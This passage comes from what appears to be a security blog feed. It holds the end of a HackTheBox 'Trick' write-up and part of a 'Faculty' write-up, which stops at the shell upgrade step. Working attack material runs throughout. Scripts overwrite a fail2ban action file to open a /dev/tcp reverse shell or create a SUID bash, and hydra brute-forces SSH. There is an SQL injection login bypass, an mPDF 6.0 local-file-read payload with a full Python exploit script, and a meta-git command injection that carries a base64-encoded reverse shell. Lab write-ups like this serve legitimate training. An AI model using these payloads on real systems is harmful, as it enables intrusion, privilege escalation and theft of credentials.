</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root       <span style="color:#ae81ff">587</span> Oct <span style="color:#ae81ff">28</span> 18:21 apf.conf
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">1045</span> Oct <span style="color:#ae81ff">28</span> 18:21 ufw.conf
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root      <span style="color:#ae81ff">6082</span> Oct <span style="color:#ae81ff">28</span> 18:21 xarf-login-attack.conf
</span></span></code></pre></div><ul>
<li>Files are only <em>writable</em> by root.</li>
</ul>
<p>From the jail configuration file (<em>/etc/fail2ban/jail.conf</em>), I can see:</p>
<pre tabindex="0"><code>...
bantime  = 10s
...
findtime  = 10s
...
maxretry = 5
...
banaction = iptables-multiport
...
</code></pre><p>Which means that the <em>ban action</em> will be triggered upon <em>5 unsuccessful login within 10 seconds</em> and will last for 10 seconds. And the file responsible for the ban action is <em>iptables-multiport.conf</em> (will get <em>executed</em> when <em>bruteforce</em> is detected).</p>
<p>So:</p>
<ul>
<li>I can <em>rename</em> the orginal file to <em>iptables-multiport.conf.bak</em> and <em>create</em> a new file that has the <em>same name and contents</em> in addition to my malicious code.</li>
<li>Change the permission of the file to be executable.</li>
<li>Then restart the service with <em>sudo</em> permission.</li>
<li>Finally trigger the ban action using 

<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank"><em>Hydra</em></a> or any other tool for bruteforcing.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_reverse_shell.sh 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = bash -c &#34;bash -i&gt;&amp; /dev/tcp/10.10.16.59/8989 0&gt;&amp;1&#34; \n#` to get a reverse shell</span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = bash -c &#34;bash -i&gt;\&amp; \/dev\/tcp\/10.10.16.59\/8989 0&gt;\&amp;1&#34; \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>michael@trick:~$ cat pwn_SUID.sh 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. rename the file</span>
</span></span><span style="display:flex;"><span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. substitute the word `actionban` from the config file with `actionban = cp /bin/bash /tmp/newbash &amp;&amp; chmod u+s /tmp/newbash \n#` to get a new SUID bash executable in /tmp/ directory</span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/actionban/actionban = cp \/bin\/bash \/tmp\/newbash \&amp;\&amp; chmod u+s \/tmp\/newbash \n#/&#39;</span> /etc/fail2ban/action.d/iptables-multiport.conf.bak &gt; /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. make the file executable and restart fail2ban service</span>
</span></span><span style="display:flex;"><span>chmod +x /etc/fail2ban/action.d/iptables-multiport.conf
</span></span><span style="display:flex;"><span>sudo /etc/init.d/fail2ban restart
</span></span></code></pre></div><p>I can either get a reverse shell or make a new <em>bash</em> executable as <em>SUID</em>.</p>
<ul>
<li>
<p>Bruteforce using 

<a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank"><em>Hydra</em></a>:</p>
<ul>
<li><code>hydra -l root -P /usr/share/wordlists/rockyou.txt trick.htb ssh -t 6 -vvv</code></li>
</ul>
</li>
<li>
<p>Bruteforce using 

<a href="https://github.com/kevinburke/sshpass" target="_blank"><em>SSHPass</em></a></p>
<ul>
<li><code>for i in {1..10}; do  time sshpass -p &quot;test&quot; ssh root@trick.htb; done</code></li>
</ul>
</li>
</ul>
<p><img src="getting_root.png" alt="Getting root"></p>
]]></content>
        </item>
        
        <item>
            <title>Faculty Write-Up</title>
            <link>https://mostxeon.github.io/posts/faculty/</link>
            <pubDate>Tue, 18 Oct 2022 20:50:11 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/faculty/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan using nmap:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A -vvv -oN nmap/all-tcp.txt 10.10.11.169
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-18 20:17 EEST
</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">155</span> scripts <span style="color:#66d9ef">for</span> scanning.
</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:17
</span></span><span style="display:flex;"><span>Completed NSE at 20:17, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating Ping Scan at 20:17
</span></span><span style="display:flex;"><span>Scanning 10.10.11.169 <span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Completed Ping Scan at 20:17, 0.14s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 20:17
</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 20:17, 0.03s elapsed
</span></span><span style="display:flex;"><span>DNS resolution of <span style="color:#ae81ff">1</span> IPs took 0.03s. Mode: Async <span style="color:#f92672">[</span><span style="color:#75715e">#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
</span></span><span style="display:flex;"><span>Initiating Connect Scan at 20:17
</span></span><span style="display:flex;"><span>Scanning 10.10.11.169 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.169
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.169
</span></span><span style="display:flex;"><span>Completed Connect Scan at 20:43, 1568.84s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating Service scan at 20:43
</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">2</span> services on 10.10.11.169
</span></span><span style="display:flex;"><span>Completed Service scan at 20:43, 6.58s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.11.169.
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 3.94s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.62s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.169
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.14s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-10-18 20:17:22 EEST <span style="color:#66d9ef">for</span> 1580s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e9418ce5544d6f14987616e7292d0216 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzpbkoBfa0UKxT+Giw4wE1jz82gGRpuANEdRt+D6gp6hDmrcaODUiU/N+4nX08jcFBk103cLwU8VisxyRu3wHMTHXaYx2WMZXPtb8clv3Hrt+q2m4eL+DBJMkHO10qCx1IwfYcNyJA3CNCj88X8RgWIREalYWyNHeQFzAHZx4SSrCP9aW5QKqAYVAAS4Za0pts4HVYlfuOrxFgO/Z3FL3xynYeyLrFM+iEx0cMl9rIYWG8NzqVnBe180u+7d/y/kcsZU6MkBMmqWQlGA6o4srVx73AqbUDChkv8glvq0ZbD1JYmACuMCdn/GFI8lRlKaw1BaYeuP0l6qgbb65ghdECYEXC3iycPkR77D6gMbIbg4F9wvzD9AF//aCR+6t8F29DyP/mh1J8a+yiUHY2HJJaDvB5vQLg5Y++9yNEDmxlGFQTdJm/n7YhP2Qj+lkfgsERAO9pfIWGCCWaXl6fddUG4gp1bHLZkek+exgsimU7hApGFrJCtYPkf78xC3pvxx0<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 4375103ecb78e9520eebcf7ffdf66d3d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH8WAd+YlbEo4Fpz3+UaOYyCJGFa/E29JORgMAIOXVlGUpvMgQqiaqDMXtbt/G03rGEI9h8dpFAmswN1LJ8uig<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c11caf762b56e8b3b88ae969737be6f5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSCwKublVScg9d/3Tc/NAh0n9XH5lE9SBfl2dl+v6F+
</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://faculty.htb
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
</span></span><span style="display:flex;"><span>Initiating NSE at 20:43
</span></span><span style="display:flex;"><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1580.64 seconds
</span></span></code></pre></div><p>I can see from the above results 2 open ports <em>80 and 22</em>.</p>
<h2 id="inspecting-web-page">Inspecting Web Page</h2>
<p>Inspecting the webpage on <em>port 80</em>, it redirects me to <em>faculty.htb</em> so I&rsquo;ll add that to my <em>/etc/hosts</em> file:</p>
<p><code>sudo echo -e '10.10.11.169\tfaculty.htb' | sudo tee -a /etc/hosts</code></p>
<p>A login page was the first page that appeared to me.</p>
<p><img src="login_page.png" alt="Login Page"></p>
<h3 id="bypassing-login-using-sqli">Bypassing Login Using SQLI</h3>
<p>The first thing I tried was a simple sql injection: <em>&lsquo;or &lsquo;1&rsquo;=&lsquo;1</em> and it worked.</p>
<p><img src="sql_injection_login_page.png" alt="SQLI Login Page"></p>
<p><img src="sqli_worked.png" alt="SQLI Worked"></p>
<h3 id="getting-the-admin-panel">Getting The Admin Panel</h3>
<p>After inspecting the source code of this single page, I saw stylesheet link pointing to <em>admin directory</em>, so I tried to navigate to this directory, and I got the admin panel.</p>
<p><img src="locating_admin_directory.png" alt="Source Code Inspection"></p>
<p><img src="admin_panel.png" alt="Admin Panel"></p>
<h3 id="exporting-pdfs">Exporting PDFs</h3>
<p>After navigating through the pages, I found that I can export some data as <em>pdf</em>, like the <em>course list</em> and <em>subject list</em>, so I&rsquo;ll try to export them and see if I can get more information from these pdfs.</p>
<p><img src="viewing_export_pdf_button.png" alt="Export PDF"></p>
<p>By looking at the <em>URL</em>, it seems that they are using 

<a href="https://mpdf.github.io/" target="_blank"><em>mPDF</em></a> to generate these pdfs.</p>
<p><img src="seeing_mpdf_in_the_url.png" alt="Noticing MPDF In URL"></p>
<p>To get more information about which version is used, I can download the pdf and use exiftool on it to see if there is an entry for the version or other useful information.</p>
<p><img src="download_button_for_pdf.png" alt="Download PDF"></p>
<p>Using 

<a href="https://exiftool.org/" target="_blank"><em>exiftool</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ exiftool OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.44
</span></span><span style="display:flex;"><span>File Name                       : OKTLw2f4x5ZgiEUChnypRQ0tWb.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">1745</span> bytes
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2022:10:18 21:30:50+03:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2022:10:18 21:30:50+03:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2022:10:18 21:30:50+03:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Page Layout                     : OneColumn
</span></span><span style="display:flex;"><span>Producer                        : mPDF 6.0
</span></span><span style="display:flex;"><span>Create Date                     : 2022:10:18 19:27:39+01:00
</span></span><span style="display:flex;"><span>Modify Date                     : 2022:10:18 19:27:39+01:00
</span></span></code></pre></div><p>I can see that the version used is <em>mPDF 6.0</em> so now I can search specifically for exploits of this version if they exist.</p>
<h3 id="understanding-how-data-is-sent-and-processed-to-generate-pdfs">Understanding How Data Is Sent And Processed To Generate PDFs</h3>
<p>First I need to understand how data is processed to generate these pdf files, so I&rsquo;ll intercept the <em>export pdf</em> request using <em>Burp Suite</em>.</p>
<p><img src="clicking_pdf_download.png" alt="Export PDF"></p>
<p><img src="intercepting_request.png" alt="Intercepting Request"></p>
<p>Looks like <em>/admin/download.php</em> expects a <em>POST</em> request, having the content of the pdf file to generate in the body of this request <em>URL encoded 2 times then Base64 encoded</em>.</p>
<p>This opens for me a new attack surface, because now I can try to inject my payloads after encoding it and let <em>mPDF 6.0</em> process it.</p>
<h3 id="locating-mpdf-lfi-exploit">Locating MPDF LFI Exploit</h3>
<p>After searching a little bit about mpdf 6.0 exploits, I saw this issue on 

<a href="https://github.com/mpdf/mpdf/issues/356" target="_blank"><em>github</em></a>. I also found this 

<a href="https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f" target="_blank"><em>blog</em></a> talking about a very similar approach to the vulnerability.</p>
<h3 id="exploiting-the-vulnerability">Exploiting the vulnerability</h3>
<p>A user can include files by injecting html code into a pdf file and thus read arbitrary files from the server, and <em>mPDF 6.0</em> was affected by that. In order to read files, I need to download the pdf and open it with a pdf viewer to be able to click on the annotation marker and read the file&rsquo;s content.</p>
<p>This is the payload I&rsquo;ll use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">annotation</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>  <span style="color:#a6e22e">icon</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Graph&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Attached File: /etc/passwd&#34;</span> <span style="color:#a6e22e">pos-x</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;195&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>Base64 encoded: PGFubm90YXRpb24lMmJmaWxlJTI1M2QiL2V0Yy9wYXNzd2QiJTJiY29udGVudCUyNTNkIi9ldGMvcGFzc3dkIiUyYiUyYmljb24lMjUzZCJHcmFwaCIlMmJ0aXRsZSUyNTNkIkF0dGFjaGVkJTJiRmlsZSUyNTNhJTJiL2V0Yy9wYXNzd2QiJTJicG9zLXglMjUzZCIxOTUiJTJiLz4=
</span></span></code></pre></div><p><img src="sending_etcpasswd_payload.png" alt="Sending /etc/passwd Payload"></p>
<p>Got the pdf name, and since I already saw the path to get the pdf I can navigate to it.</p>
<p><img src="downloading_etcpasswd_pdf.png" alt="Downloading /etc/passwd pdf"></p>
<p>The pdf looks empty and this is because I opened it using firefox, so the annotation mark will not appear, that&rsquo;s why I need to download it and open it with a proper pdf viewer. (I&rsquo;ll use kali&rsquo;s default pdf viewer <em>Atril Document Viewer</em>)</p>
<p><img src="Seeing_etcpasswd_attachment.png" alt="Viewing /etc/passwd Annotation Mark"></p>
<p>Upon clicking the annotation, a new window will popup showing the contents of the file.</p>
<p><img src="reading_etcpasswd_from_annotation.png" alt="Reading /etc/passwd from Annotation"></p>
<p>I wrote a <em>python3 script</em> that will automate all this work otherwise it will be painfull to download every pdf manually and then open it to read the contents.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> io
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> PyPDF2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Please provide a filename as argument&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fileToRead <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>getPdfURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/admin/download.php&#34;</span>
</span></span><span style="display:flex;"><span>downloadPdfURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://faculty.htb/mpdf/tmp/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;annotation file=&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; content=&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;  icon=&#34;Graph&#34; title=&#34;Attached File: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; pos-x=&#34;195&#34; /&gt;&#39;</span><span style="color:#f92672">.</span>format(fileToRead,fileToRead,fileToRead)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>))<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[!] Base64 encoded payload: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(payload))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>pdfName <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(getPdfURL, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pdf=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(payload), headers<span style="color:#f92672">=</span>headers)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Got filename: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(pdfName))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pdfContent <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(downloadPdfURL <span style="color:#f92672">+</span> pdfName)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>pdf <span style="color:#f92672">=</span> PyPDF2<span style="color:#f92672">.</span>PdfReader(io<span style="color:#f92672">.</span>BytesIO(pdfContent))
</span></span><span style="display:flex;"><span>catalog <span style="color:#f92672">=</span> pdf<span style="color:#f92672">.</span>trailer[<span style="color:#e6db74">&#39;/Root&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://www.bitsgalore.org/2013/01/09/what-do-we-mean-embedded-files-pdf</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Reading </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(fileToRead), pdf<span style="color:#f92672">.</span>getPage(<span style="color:#ae81ff">0</span>)[<span style="color:#e6db74">&#39;/Annots&#39;</span>][<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>getObject()[<span style="color:#e6db74">&#39;/FS&#39;</span>][<span style="color:#e6db74">&#39;/EF&#39;</span>][<span style="color:#e6db74">&#39;/F&#39;</span>]<span style="color:#f92672">.</span>getData()<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><p><img src="reading_etcpasswd_using_script.png" alt="Reading Files Using Script"></p>
<h3 id="reading-database-credentials">Reading Database Credentials</h3>
<p>The first thing I&rsquo;ll do is to look for the main application code like <em>index.php</em> to see if I can find the <em>database configuration</em> file to get some <em>credentials</em>.</p>
<p><img src="reading_index.php_.png" alt="Reading index.php"></p>
<p><img src="reading_login.php_.png" alt="Reading login.php"></p>
<p><img src="reading_db_connect.php_.png" alt="Reading db_connect.php"></p>
<p>I know from the <em>/etc/passwd</em> file read before that there are 2 users on the box <em>gbyolo</em> and <em>developer</em> (They have their own <em>home directory</em> and <em>/bin/bash</em> as login shell).</p>
<p><img src="enumerating_users_from_etcpasswd.png" alt="Enumerate Users From /etc/passwd"></p>
<p>I can try to SSH using these users providing the password got from reading <em>db_connect.php</em> because people usually reuse passwords everywhere.</p>
<p><img src="ssh_as_gbyolo.png" alt="SSH As gbyolo"></p>
<p>And it worked using <em>gbyolo</em> as username.</p>
<h2 id="escalating-from-user-gbyolo-to-developer">Escalating From User gbyolo To developer</h2>
<p>If I run <code>sudo -l</code> I get the following result:</p>
<p><img src="sudo_dash_l.png" alt="sudo -l As gbyolo"></p>
<p>User gbyolo can run <em>meta-git</em> as developer, howerver this executable is inside <em>/usr/local/bin</em> which means that it was installed manually (wasn&rsquo;t installed using a package manager like <em>apt</em> for example) and there is a big chance that it is out of date and could have some vulnerabilities.</p>
<p>Searching a little bit on google about meta-git and some possible exploits, I found this 

<a href="https://hackerone.com/reports/728040" target="_blank"><em>bug report</em></a> on 

<a href="https://hackerone.com" target="_blank"><em>HackerOne</em></a> which affects every version of <em>meta-git</em> according to 

<a href="https://security.snyk.io/package/npm/meta-git" target="_blank"><em>snyk</em></a>.</p>
<p>I can get a reverse shell now as user developer.</p>
<p><code>sudo -u developer /usr/local/bin/meta-git clone 'sss||echo YmFzaCAtaT4mIC9kZXYvdGNwLzEwLjEwLjE2LjU5Lzg5ODkgMD4mMQo= | base64 -d | bash'</code></p>
<p>Howerver I need to be first in a directory writable by developer user, so I will navigate to <em>/tmp/</em>.</p>
<p><img src="gettting_reverse_shell_as_developer.png" alt="Getting Reverse Shell As developer"></p>
<p>I will get a fully interactive shell using python:</p>
